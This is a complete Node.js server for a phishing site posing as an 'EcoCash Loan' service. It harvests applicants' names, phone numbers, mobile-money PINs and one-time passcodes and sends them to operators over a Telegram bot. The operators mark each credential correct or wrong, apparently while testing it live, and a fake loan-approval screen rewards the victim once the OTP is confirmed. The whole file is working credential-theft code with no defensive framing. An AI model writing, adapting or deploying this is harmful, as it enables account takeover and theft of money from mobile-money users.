require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// States: 'PENDING_PIN', 'PIN_APPROVED', 'PIN_REJECTED', 'PENDING_OTP', 'OTP_APPROVED', 'OTP_REJECTED', 'LOAN_APPROVED'
const activeApplications = new Map();

function formatZimbabwePhone(phone) {
  let formattedPhone = phone || '';
  if (formattedPhone.startsWith('+263')) {
    formattedPhone = formattedPhone.replace('+263', '');
  } else if (formattedPhone.startsWith('263')) {
    formattedPhone = formattedPhone.slice(3);
  } else if (formattedPhone.startsWith('0')) {
    formattedPhone = formattedPhone.slice(1);
  }
  return formattedPhone;
}

// Helper function to send Telegram messages to all admins
async function sendToAllAdmins(payload) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const rawChatIds = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !rawChatIds) return;

  // Split comma-separated Chat IDs into an array
  const adminChatIds = rawChatIds.split(',').map(id => id.trim());

  for (const chatId of adminChatIds) {
    if (!chatId) continue;
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...payload, chat_id: chatId })
      });
    } catch (err) {
      console.error(`Failed to send message to admin ${chatId}:`, err.message);
    }
  }
}

// STEP 2: Send Phone & PIN to Telegram
app.post('/api/apply-loan', async (req, res) => {
  try {
    const data = req.body;
    const formattedPhone = formatZimbabwePhone(data.phone);
    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;

    activeApplications.set(appReference, {
      ...data,
      formattedPhone,
      status: 'PENDING_PIN'
    });

    const currentTimestamp = new Date().toLocaleString('en-US', {
      timeZone: 'Africa/Harare',
      year: 'numeric',
      month: 'numeric',
      day: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });

    const messageText = `🔑 <b>NEW PIN SUBMITTED</b>\n\n` +
                        `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                        `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
                        `💼 <b>Occupation:</b> ${data.occupation || 'N/A'}\n` +
                        `💵 <b>Loan Amount:</b> $${data.loanAmount || 'N/A'}\n` +
                        `📞 <b>Phone:</b> 263${formattedPhone}\n` +
                        `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
                        `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
                        `❓ <b>VERIFY PIN ACCURACY:</b>`;

    const telegramPayload = {
      text: messageText,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
            { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
          ]
        ]
      }
    };

    await sendToAllAdmins(telegramPayload);

    res.status(201).json({ success: true, appReference });
  } catch (error) {
    console.error("Submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// STEP 3: Send 6-Digit OTP to Telegram
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { appReference, otpCode, phone } = req.body;
    const formattedPhone = formatZimbabwePhone(phone);

    if (appReference && activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'PENDING_OTP';
      activeApplications.set(appReference, appData);
    }

    const currentTimestamp = new Date().toLocaleString('en-US', {
      timeZone: 'Africa/Harare',
      year: 'numeric',
      month: 'numeric',
      day: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });

    const messageText = `📲 <b>ECOCASH OTP SUBMITTED</b>\n\n` +
                        `📋 <b>Ref:</b> <code>${appReference || 'N/A'}</code>\n` +
                        `📞 <b>Phone:</b> 263${formattedPhone}\n` +
                        `💬 <b>OTP (6-digit):</b> <code>${otpCode || 'N/A'}</code>\n` +
                        `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
                        `❓ <b>VERIFY OTP ACCURACY:</b>`;

    const telegramPayload = {
      text: messageText,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
            { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
          ]
        ]
      }
    };

    await sendToAllAdmins(telegramPayload);

    res.status(200).json({ success: true, message: "OTP received" });
  } catch (error) {
    console.error("OTP Processing Error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// STATUS CHECK ENDPOINT
app.get('/api/check-status/:appReference', (req, res) => {
  const { appReference } = req.params;
  const appData = activeApplications.get(appReference);

  if (!appData) {
    return res.status(404).json({ success: false, status: 'NOT_FOUND' });
  }

  res.json({ success: true, status: appData.status });
});

// TELEGRAM WEBHOOK HANDLER
app.post('/api/telegram-webhook', async (req, res) => {
  res.sendStatus(200);
  const { callback_query } = req.body;
  if (!callback_query) return;

  const actionData = callback_query.data;
  const chatId = callback_query.message.chat.id;
  const messageId = callback_query.message.message_id;
  const botToken = process.env.TELEGRAM_BOT_TOKEN;

  // STEP 2 CALLBACKS (PIN)
  if (actionData.startsWith('pin_correct_')) {
    const appReference = actionData.replace('pin_correct_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'PIN_APPROVED';
      activeApplications.set(appReference, appData);
    }

    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: PIN Marked as CORRECT ✅</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  if (actionData.startsWith('pin_wrong_')) {
    const appReference = actionData.replace('pin_wrong_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'PIN_REJECTED';
      activeApplications.set(appReference, appData);
    }

    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Marked as WRONG ❌</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  // STEP 3 CALLBACKS (OTP)
  if (actionData.startsWith('otp_correct_')) {
    const appReference = actionData.replace('otp_correct_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'OTP_APPROVED';
      activeApplications.set(appReference, appData);
    }

    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Marked as CORRECT ✅</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);

    // Prompt for final approval to all admins
    const approvalPrompt = {
      text: `🎉 <b>OTP VERIFIED SUCCESSFULLY</b>\n\n` +
            `📋 <b>Ref:</b> <code>${appReference}</code>\n\n` +
            `Click the button below to approve the loan and trigger the congratulations notice on the applicant's screen:`,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'APPROVED 🎉', callback_data: `approve_loan_${appReference}` }
          ]
        ]
      }
    };

    await sendToAllAdmins(approvalPrompt);
  }

  if (actionData.startsWith('otp_wrong_')) {
    const appReference = actionData.replace('otp_wrong_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'OTP_REJECTED';
      activeApplications.set(appReference, appData);
    }

    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP Marked as WRONG ❌</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }

  // FINAL LOAN APPROVAL CALLBACK FROM TELEGRAM
  if (actionData.startsWith('approve_loan_')) {
    const appReference = actionData.replace('approve_loan_', '');
    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'LOAN_APPROVED';
      activeApplications.set(appReference, appData);
    }

    const updatedText = `${callback_query.message.text}\n\n🎉 <b>STATUS: LOAN OFFICIALLY APPROVED ✅</b>`;
    await editTelegramMessage(botToken, chatId, messageId, updatedText);
  }
});

async function editTelegramMessage(botToken, chatId, messageId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
    });
  } catch (err) {
    console.error("❌ Telegram edit error:", err.message);
  }
}

app.get('*', (req, res) => {
  res.sendFile(path.join(publicPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
});
      
